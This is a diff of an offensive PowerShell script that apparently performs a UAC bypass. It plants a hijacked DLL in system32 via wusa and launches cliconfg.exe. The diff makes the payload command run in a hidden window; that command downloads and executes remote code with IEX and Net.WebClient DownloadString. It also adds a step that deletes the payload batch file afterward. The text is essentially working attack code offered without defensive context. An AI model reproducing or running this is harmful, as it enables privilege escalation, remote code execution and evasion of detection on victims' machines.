@@ -2926,7 +2926,7 @@ Param(
 add-content -value $sc64 -encoding byte -path $env:temp\NTWDBLIB.dll
 
 
-$powercommand = "powershell.exe -NOEXIT -Exec ByPass IEX (new-object Net.WebClient).DownloadString('$url'); $command" + " > %TEMP%\LOG.TXT"
+$powercommand = "powershell.exe -windowstyle hidden -Exec ByPass IEX (new-object Net.WebClient).DownloadString('$url'); $command" + " > %TEMP%\LOG.TXT"
 $powercommand 
 $powercommand | OUT-file -encoding default -file $env:temp\payload.bat
 #$Spayload= "start /b %temp%\pay.bat" | OUT-file -encoding default -file $env:temp\payload.bat
@@ -2938,5 +2938,7 @@ del $env:temp\NTWDBLIB.dll
 wusa $env:temp\poc.tmp /extract:c:\windows\system32\
 $com = 'c:\windows\system32\cliconfg.exe'
 Invoke-Expression -Command:$com 
+sleep -seconds 3
+del $env:temp\payload.bat
 
 }
